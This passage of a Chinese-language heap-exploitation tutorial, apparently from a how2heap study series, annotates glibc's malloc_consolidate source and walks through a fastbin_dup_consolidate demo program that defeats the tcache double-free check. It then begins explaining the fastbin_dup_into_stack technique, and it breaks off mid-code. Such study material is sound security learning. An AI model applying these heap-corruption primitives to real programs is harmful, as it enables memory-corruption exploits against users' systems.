punctuation\">;</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre></pre></td></tr><tr><td data-num=\"41\"></td><td><pre>    unsorted_bin <span class=\"token operator\">=</span> <span class=\"token function\">unsorted_chunks</span><span class=\"token punctuation\">(</span>av<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"42\"></td><td><pre></pre></td></tr><tr><td data-num=\"43\"></td><td><pre>    <span class=\"token comment\">/*</pre></td></tr><tr><td data-num=\"44\"></td><td><pre>      Remove each chunk from fast bin and consolidate it, placing it</pre></td></tr><tr><td data-num=\"45\"></td><td><pre>      then in unsorted bin. Among other reasons for doing this,</pre></td></tr><tr><td data-num=\"46\"></td><td><pre>      placing in unsorted bin avoids needing to calculate actual bins</pre></td></tr><tr><td data-num=\"47\"></td><td><pre>      until malloc is sure that chunks aren't immediately going to be</pre></td></tr><tr><td data-num=\"48\"></td><td><pre>      reused anyway.</pre></td></tr><tr><td data-num=\"49\"></td><td><pre>    */</span></pre></td></tr><tr><td data-num=\"50\"></td><td><pre></pre></td></tr><tr><td data-num=\"51\"></td><td><pre>    maxfb <span class=\"token operator\">=</span> <span class=\"token operator\">&amp;</span><span class=\"token function\">fastbin</span> <span class=\"token punctuation\">(</span>av<span class=\"token punctuation\">,</span> NFASTBINS <span class=\"token operator\">-</span> <span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"52\"></td><td><pre>    fb <span class=\"token operator\">=</span> <span class=\"token operator\">&amp;</span><span class=\"token function\">fastbin</span> <span class=\"token punctuation\">(</span>av<span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"53\"></td><td><pre>    <span class=\"token keyword\">do</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"54\"></td><td><pre>      p <span class=\"token operator\">=</span> <span class=\"token function\">atomic_exchange_acq</span> <span class=\"token punctuation\">(</span>fb<span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"55\"></td><td><pre>      <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>p <span class=\"token operator\">!=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"56\"></td><td><pre>\t<span class=\"token keyword\">do</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"57\"></td><td><pre>\t  <span class=\"token function\">check_inuse_chunk</span><span class=\"token punctuation\">(</span>av<span class=\"token punctuation\">,</span> p<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"58\"></td><td><pre>\t  nextp <span class=\"token operator\">=</span> p<span class=\"token operator\">-></span>fd<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"59\"></td><td><pre></pre></td></tr><tr><td data-num=\"60\"></td><td><pre>\t  <span class=\"token comment\">/* Slightly streamlined version of consolidation code in free() */</span></pre></td></tr><tr><td data-num=\"61\"></td><td><pre>\t  size <span class=\"token operator\">=</span> p<span class=\"token operator\">-></span>size <span class=\"token operator\">&amp;</span> <span class=\"token operator\">~</span><span class=\"token punctuation\">(</span>PREV_INUSE<span class=\"token operator\">|</span>NON_MAIN_ARENA<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"62\"></td><td><pre>\t  nextchunk <span class=\"token operator\">=</span> <span class=\"token function\">chunk_at_offset</span><span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">,</span> size<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"63\"></td><td><pre>\t  nextsize <span class=\"token operator\">=</span> <span class=\"token function\">chunksize</span><span class=\"token punctuation\">(</span>nextchunk<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"64\"></td><td><pre></pre></td></tr><tr><td data-num=\"65\"></td><td><pre>\t  <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token function\">prev_inuse</span><span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span> <span class=\"token comment\">// 判断向前合并</span></pre></td></tr><tr><td data-num=\"66\"></td><td><pre>\t    prevsize <span class=\"token operator\">=</span> p<span class=\"token operator\">-></span>prev_size<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"67\"></td><td><pre>\t    size <span class=\"token operator\">+=</span> prevsize<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"68\"></td><td><pre>\t    p <span class=\"token operator\">=</span> <span class=\"token function\">chunk_at_offset</span><span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">,</span> <span class=\"token operator\">-</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">long</span><span class=\"token punctuation\">)</span> prevsize<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"69\"></td><td><pre>\t    <span class=\"token function\">unlink</span><span class=\"token punctuation\">(</span>av<span class=\"token punctuation\">,</span> p<span class=\"token punctuation\">,</span> bck<span class=\"token punctuation\">,</span> fwd<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"70\"></td><td><pre>\t  <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"71\"></td><td><pre></pre></td></tr><tr><td data-num=\"72\"></td><td><pre>\t  <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>nextchunk <span class=\"token operator\">!=</span> av<span class=\"token operator\">-></span>top<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span><span class=\"token comment\">// 不紧挨着 topchunk</span></pre></td></tr><tr><td data-num=\"73\"></td><td><pre>\t    nextinuse <span class=\"token operator\">=</span> <span class=\"token function\">inuse_bit_at_offset</span><span class=\"token punctuation\">(</span>nextchunk<span class=\"token punctuation\">,</span> nextsize<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"74\"></td><td><pre></pre></td></tr><tr><td data-num=\"75\"></td><td><pre>\t    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">!</span>nextinuse<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"76\"></td><td><pre>\t      size <span class=\"token operator\">+=</span> nextsize<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"77\"></td><td><pre>\t      <span class=\"token function\">unlink</span><span class=\"token punctuation\">(</span>av<span class=\"token punctuation\">,</span> nextchunk<span class=\"token punctuation\">,</span> bck<span class=\"token punctuation\">,</span> fwd<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"78\"></td><td><pre>\t    <span class=\"token punctuation\">&#125;</span> <span class=\"token keyword\">else</span></pre></td></tr><tr><td data-num=\"79\"></td><td><pre>\t      <span class=\"token function\">clear_inuse_bit_at_offset</span><span class=\"token punctuation\">(</span>nextchunk<span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"80\"></td><td><pre></pre></td></tr><tr><td data-num=\"81\"></td><td><pre>\t    first_unsorted <span class=\"token operator\">=</span> unsorted_bin<span class=\"token operator\">-></span>fd<span class=\"token punctuation\">;</span> <span class=\"token comment\">// 插入到 unstored_bin 中</span></pre></td></tr><tr><td data-num=\"82\"></td><td><pre>\t    unsorted_bin<span class=\"token operator\">-></span>fd <span class=\"token operator\">=</span> p<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"83\"></td><td><pre>\t    first_unsorted<span class=\"token operator\">-></span>bk <span class=\"token operator\">=</span> p<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"84\"></td><td><pre></pre></td></tr><tr><td data-num=\"85\"></td><td><pre>\t    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token function\">in_smallbin_range</span> <span class=\"token punctuation\">(</span>size<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span> <span class=\"token comment\">// 不符合 smallbin 的范围进入 largebin</span></pre></td></tr><tr><td data-num=\"86\"></td><td><pre>\t      p<span class=\"token operator\">-></span>fd_nextsize <span class=\"token operator\">=</span> <span class=\"token constant\">NULL</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"87\"></td><td><pre>\t      p<span class=\"token operator\">-></span>bk_nextsize <span class=\"token operator\">=</span> <span class=\"token constant\">NULL</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"88\"></td><td><pre>\t    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"89\"></td><td><pre></pre></td></tr><tr><td data-num=\"90\"></td><td><pre>\t    <span class=\"token function\">set_head</span><span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">,</span> size <span class=\"token operator\">|</span> PREV_INUSE<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"91\"></td><td><pre>\t    p<span class=\"token operator\">-></span>bk <span class=\"token operator\">=</span> unsorted_bin<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"92\"></td><td><pre>\t    p<span class=\"token operator\">-></span>fd <span class=\"token operator\">=</span> first_unsorted<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"93\"></td><td><pre>\t    <span class=\"token function\">set_foot</span><span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">,</span> size<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"94\"></td><td><pre>\t  <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"95\"></td><td><pre></pre></td></tr><tr><td data-num=\"96\"></td><td><pre>\t  <span class=\"token keyword\">else</span> <span class=\"token punctuation\">&#123;</span> <span class=\"token comment\">// 下一个 chunk 为 top chunk</span></pre></td></tr><tr><td data-num=\"97\"></td><td><pre>\t    size <span class=\"token operator\">+=</span> nextsize<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"98\"></td><td><pre>\t    <span class=\"token function\">set_head</span><span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">,</span> size <span class=\"token operator\">|</span> PREV_INUSE<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"99\"></td><td><pre>\t    av<span class=\"token operator\">-></span>top <span class=\"token operator\">=</span> p<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"100\"></td><td><pre>\t  <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"101\"></td><td><pre></pre></td></tr><tr><td data-num=\"102\"></td><td><pre>\t<span class=\"token punctuation\">&#125;</span> <span class=\"token keyword\">while</span> <span class=\"token punctuation\">(</span> <span class=\"token punctuation\">(</span>p <span class=\"token operator\">=</span> nextp<span class=\"token punctuation\">)</span> <span class=\"token operator\">!=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"103\"></td><td><pre></pre></td></tr><tr><td data-num=\"104\"></td><td><pre>      <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"105\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span> <span class=\"token keyword\">while</span> <span class=\"token punctuation\">(</span>fb<span class=\"token operator\">++</span> <span class=\"token operator\">!=</span> maxfb<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"106\"></td><td><pre>  <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"107\"></td><td><pre>  <span class=\"token keyword\">else</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"108\"></td><td><pre>    <span class=\"token function\">malloc_init_state</span><span class=\"token punctuation\">(</span>av<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// 初始化</span></pre></td></tr><tr><td data-num=\"109\"></td><td><pre>    <span class=\"token function\">check_malloc_state</span><span class=\"token punctuation\">(</span>av<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"110\"></td><td><pre>  <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"111\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><h2 id=\"源码\"><a class=\"anchor\" href=\"#源码\">#</a> 源码：</h2>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"><span>c</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;stdio.h></span></span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;stdlib.h></span></span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;assert.h></span></span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token keyword\">void</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>\t<span class=\"token comment\">// reference: https://valsamaras.medium.com/the-toddlers-introduction-to-heap-exploitation-fastbin-dup-consolidate-part-4-2-ce6d68136aa8</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>\t<span class=\"token function\">puts</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"This is a powerful technique that bypasses the double free check in tcachebin.\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>\t<span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Fill up the tcache list to force the fastbin usage...\\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>\t<span class=\"token keyword\">void</span><span class=\"token operator\">*</span> p1 <span class=\"token operator\">=</span> <span class=\"token function\">calloc</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span><span class=\"token number\">0x40</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token comment\">// 先分配一个小的 chunk</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>\t<span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Allocate another chunk of the same size p1=%p \\n\"</span><span class=\"token punctuation\">,</span> p1<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>\t<span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Freeing p1 will add this chunk to the fastbin list...\\n\\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>\t<span class=\"token function\">free</span><span class=\"token punctuation\">(</span>p1<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token comment\">// 释放进入 fastbin</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>\t<span class=\"token keyword\">void</span><span class=\"token operator\">*</span> p3 <span class=\"token operator\">=</span> <span class=\"token function\">malloc</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x400</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token comment\">// 分配一个大的 chunk，小的如果紧挨着 topchunk 就与 top chunk 合并</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>\t<span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Allocating a tcache-sized chunk (p3=%p)\\n\"</span><span class=\"token punctuation\">,</span> p3<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>\t<span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"will trigger the malloc_consolidate and merge\\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>\t<span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"the fastbin chunks into the top chunk, thus\\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>\t<span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"p1 and p3 are now pointing to the same chunk !\\n\\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>\t<span class=\"token function\">assert</span><span class=\"token punctuation\">(</span>p1 <span class=\"token operator\">==</span> p3<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>\t<span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Triggering the double free vulnerability!\\n\\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>\t<span class=\"token function\">free</span><span class=\"token punctuation\">(</span>p1<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token comment\">// 释放这个 largebin</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>\t<span class=\"token keyword\">void</span> <span class=\"token operator\">*</span>p4 <span class=\"token operator\">=</span> <span class=\"token function\">malloc</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x400</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>\t<span class=\"token function\">assert</span><span class=\"token punctuation\">(</span>p4 <span class=\"token operator\">==</span> p3<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>\t<span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"The double free added the chunk referenced by p1 \\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>\t<span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"to the tcache thus the next similar-size malloc will\\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>\t<span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"point to p3: p3=%p, p4=%p\\n\\n\"</span><span class=\"token punctuation\">,</span>p3<span class=\"token punctuation\">,</span> p4<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>执行情况：</p>\n<p>先申请一个小 chunk，释放后进入 fastbin，然后再申请一个大 chunk，将小 chunk 放入 <code>unsortedbin</code>  然后再放入对应的 <code>chunk</code>  (small chunk), 这个申请的 <code>大chunk</code>  会将前面释放的 <code>小的chunk</code>  合并，作为这个申请的大 chunk 的部分使用</p>\n<h2 id=\"2调试程序-2\"><a class=\"anchor\" href=\"#2调试程序-2\">#</a> 2. 调试程序：</h2>\n<h3 id=\"1执行完p1calloc10x40\"><a class=\"anchor\" href=\"#1执行完p1calloc10x40\">#</a> 1. 执行完 <code>p1=calloc(1,0x40)</code></h3>\n<p><img data-src=\"https://vvwwv.oss-cn-nanjing.aliyuncs.com/how2heap/73544%5BZ0SY%288NF2QN%7BR_WPT.png\" alt=\"\" /></p>\n<h3 id=\"2执行到freep1\"><a class=\"anchor\" href=\"#2执行到freep1\">#</a> 2. 执行到 <code>free(p1);</code></h3>\n<p><img data-src=\"https://vvwwv.oss-cn-nanjing.aliyuncs.com/how2heap/Q_%28Z%40ERFA9%7EJK__KOV%5BCC%258.png\" alt=\"\" /></p>\n<h3 id=\"3执行到p3-malloc0x400\"><a class=\"anchor\" href=\"#3执行到p3-malloc0x400\">#</a> 3. 执行到 <code>p3 = malloc(0x400);</code></h3>\n<p>从下面的图里可以发现</p>\n<p><img data-src=\"https://vvwwv.oss-cn-nanjing.aliyuncs.com/how2heap/R2FD%28J2%40%5BCZI%5DH%5B%5DY5%24%7ETU0.png\" alt=\"\" /></p>\n<p>p1 被合并了，这是因为 p1 紧紧挨着 <code>top chunk</code> ，导致申请一个 <code>large_bin</code>  会执行 <code>malloc_consolidate (av);</code></p>\n<p><img data-src=\"https://vvwwv.oss-cn-nanjing.aliyuncs.com/how2heap/TF95HBY0%40_XHZ3%29K2IP%24%2988.png\" alt=\"\" /></p>\n<p>这样会将 fastbin 进行变动，紧挨着 top chunk 就会与 top chunk 合并，不紧挨着就会进入 unsorted 再判断进入 <code>small_bin</code>  还是 <code>large_bin</code> ，因此 p1 的 chunk 就与 <code>top chunk</code>  合并，接着就被 p3 给申请了（ <code>p3 = malloc(0x400)</code> ），所以 p3 与 p1 指针是同一个地址（因此能够顺利通过 22 行 <code>assert(p1 == p3);</code>  的判断），就将 p1 的 chunk 覆盖了</p>\n<h3 id=\"4执行到25行freep1\"><a class=\"anchor\" href=\"#4执行到25行freep1\">#</a> 4. 执行到 25 行 <code>free(p1);</code></h3>\n<p>可以发现原本应该是 p3 的 chunk，通过释放 p1 也释放了，因为 <code>p1=p3</code> , 最终就回归了 <code>top chunk</code></p>\n<p><img data-src=\"https://vvwwv.oss-cn-nanjing.aliyuncs.com/how2heap/J%29%60HJ4KDX74RPGUHV%7D1W7YC.png\" alt=\"\" /></p>\n<h3 id=\"5执行到27行p4-malloc0x400\"><a class=\"anchor\" href=\"#5执行到27行p4-malloc0x400\">#</a> 5. 执行到 27 行 <code>p4 = malloc(0x400)</code></h3>\n<p>注意这里是 <code>p4</code> , 这里接着从 <code>top chunk</code>  申请一个 <code>large chunk</code> ，可以发现仍然占用的是前面 p1 和 p3 的位置</p>\n<p><img data-src=\"https://vvwwv.oss-cn-nanjing.aliyuncs.com/how2heap/%40_RS40J9IDU6CZA02R%7E%7D93W.png\" alt=\"\" /></p>\n<h3 id=\"6程序运行结束\"><a class=\"anchor\" href=\"#6程序运行结束\">#</a> 6. 程序运行结束</h3>\n<p>最后运行结果也展示了 p1、p3 和 p4 的地址都是同一个，也证明了即使释放（free）后，没有将指针置空就导致会被复用，导致可以通过其他的指针对一个 chunk 进行修改，</p>\n<h1 id=\"3fastbin_dup_into_stackc\"><a class=\"anchor\" href=\"#3fastbin_dup_into_stackc\">#</a> 3. <code>fastbin_dup_into_stack.c</code></h1>\n<p>该例子通过在栈上找到（伪造）一个合适的 size 来，然后通过 double free 来进行修改 chunk 的 fd，最后就能够申请到这个栈空间作为 chunk，从而对栈进入任意的修改</p>\n<p>这里为什么 fastbin 只要构造一个 size 就可以伪造成功，这里根据源码可以知道 (3368 行)：</p>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"><span>c</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">long</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">(</span>nb<span class=\"token punctuation\">)</span> <span class=\"token operator\">&lt;=</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">long</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">(</span><span class=\"token function\">get_max_fast</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>  <span class=\"token comment\">// 这里是申请对 fastbin 申请 chunk</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>      idx <span class=\"token operator\">=</span> <span class=\"token function\">fastbin_index</span> <span class=\"token punctuation\">(</span>nb<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>      mfastbinptr <span class=\"token operator\">*</span>fb <span class=\"token operator\">=</span> <span class=\"token operator\">&amp;</span><span class=\"token function\">fastbin</span> <span class=\"token punctuation\">(</span>av<span class=\"token punctuation\">,</span> idx<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>      mchunkptr pp <span class=\"token operator\">=</span> <span class=\"token operator\">*</span>fb<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>      <span class=\"token keyword\">do</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>        <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>          victim <span class=\"token operator\">=</span> pp<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>          <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>victim <span class=\"token operator\">==</span> <span class=\"token constant\">NULL</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>            <span class=\"token keyword\">break</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>      <span class=\"token keyword\">while</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>pp <span class=\"token operator\">=</span> <span class=\"token function\">catomic_compare_and_exchange_val_acq</span> <span class=\"token punctuation\">(</span>fb<span class=\"token punctuation\">,</span> victim<span class=\"token operator\">-></span>fd<span class=\"token punctuation\">,</span> victim<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>             <span class=\"token operator\">!=</span> victim<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>      <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>victim <span class=\"token operator\">!=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>        <span class=\"token punctuation\">&#123;</span>     <span class=\"token comment\">// 检测链表的 size 是否合法</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>          <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token function\">__builtin_expect</span> <span class=\"token punctuation\">(</span><span class=\"token function\">fastbin_index</span> <span class=\"token punctuation\">(</span><span class=\"token function\">chunksize</span> <span class=\"token punctuation\">(</span>victim<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">!=</span> idx<span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>            <span class=\"token punctuation\">&#123;</span> <span class=\"token comment\">// 不合法</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>              errstr <span class=\"token operator\">=</span> <span class=\"token string\">\"malloc(): memory corruption (fast)\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>            errout<span class=\"token operator\">:</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>              <span class=\"token function\">malloc_printerr</span> <span class=\"token punctuation\">(</span>check_action<span class=\"token punctuation\">,</span> errstr<span class=\"token punctuation\">,</span> <span class=\"token function\">chunk2mem</span> <span class=\"token punctuation\">(</span>victim<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> av<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>              <span class=\"token keyword\">return</span> <span class=\"token constant\">NULL</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>            <span class=\"token punctuation\">&#125;</span> <span class=\"token comment\">// 合法得到符合的返回</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>          <span class=\"token function\">check_remalloced_chunk</span> <span class=\"token punctuation\">(</span>av<span class=\"token punctuation\">,</span> victim<span class=\"token punctuation\">,</span> nb<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>          <span class=\"token keyword\">void</span> <span class=\"token operator\">*</span>p <span class=\"token 